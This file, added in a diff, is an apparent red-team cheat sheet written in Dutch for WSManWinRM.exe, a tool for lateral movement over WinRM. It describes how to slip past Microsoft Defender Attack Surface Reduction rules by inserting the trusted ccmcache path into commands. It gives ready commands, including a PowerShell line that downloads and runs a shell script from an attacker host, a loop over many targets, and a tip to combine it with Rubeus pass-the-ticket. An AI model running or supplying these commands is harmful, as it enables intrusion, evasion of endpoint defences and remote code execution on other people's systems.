@@ -1,0 +1,30 @@
+# WSManWinRM.exe — WinRM lateral movement met ASR bypass
+# Lateral movement via WinRM (WSMan) met ASR (Attack Surface Reduction) bypass
+# Omzeilt ASR regels door ccmcache pad toe te voegen aan command
+#
+# === Syntax ===
+# WSManWinRM.exe <doelwit> <gebruiker> <wachtwoord> <commando>
+#
+# === ASR bypass ===
+# Microsoft Defender ASR blokkeert process creation vanuit WinRM
+# Bypass: voeg C:\Windows\ccmcache\" toe aan het commando
+# Dit pad wordt vertrouwd door ASR (SCCM client cache)
+#
+# === Voorbeelden ===
+
+# Basis lateral movement
+WSManWinRM.exe TARGET USER PASS "whoami"
+
+# Met ASR bypass — voeg ccmcache pad toe
+WSManWinRM.exe TARGET USER PASS "C:\Windows\ccmcache\" cmd /c whoami"
+
+# Reverse shell met ASR bypass
+WSManWinRM.exe TARGET USER PASS "C:\Windows\ccmcache\" powershell -ep bypass -c IEX(iwr http://ATTACKER_IP/shell.ps1 -UseBasicParsing)"
+
+# Commando op meerdere machines (loop)
+# for /f %i in (targets.txt) do WSManWinRM.exe %i USER PASS "hostname"
+
+# Noot: Vereist WinRM (5985/5986) open op doelwit
+# Noot: ASR bypass werkt door ccmcache als vertrouwd pad in de ASR policy
+# Noot: Alternatief voor Invoke-Command / Enter-PSSession wanneer ASR blokkeert
+# Noot: Combineer met Rubeus PTT voor Kerberos authenticatie
